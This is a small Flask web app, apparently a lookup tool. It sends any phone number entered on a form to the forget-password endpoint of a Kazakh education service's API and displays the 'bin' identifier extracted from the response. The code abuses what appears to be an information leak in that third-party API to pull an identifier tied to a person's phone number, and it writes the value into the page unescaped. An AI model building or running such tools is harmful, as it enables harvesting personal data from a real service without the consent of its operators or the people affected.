
from flask import Flask, request

import requests

app = Flask(__name__)

@app.route('/')
def hello_world():
    phone = request.args.get('phone')
    bin = None
    if phone:
        try:
            r = requests.post("https://api.edu.iqanat.kz/auth/activations/forget_password/", json = {"phone":phone,"reason":"REGISTER"}).json()
            bin = r['result']['bin']
        except:
            pass
    l = '<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">'
    return l+f'<p>{bin}</p>'+'<form method="get"><input type="text" name="phone" placeholder="Номер телефона"><br><input type="submit"></form>'

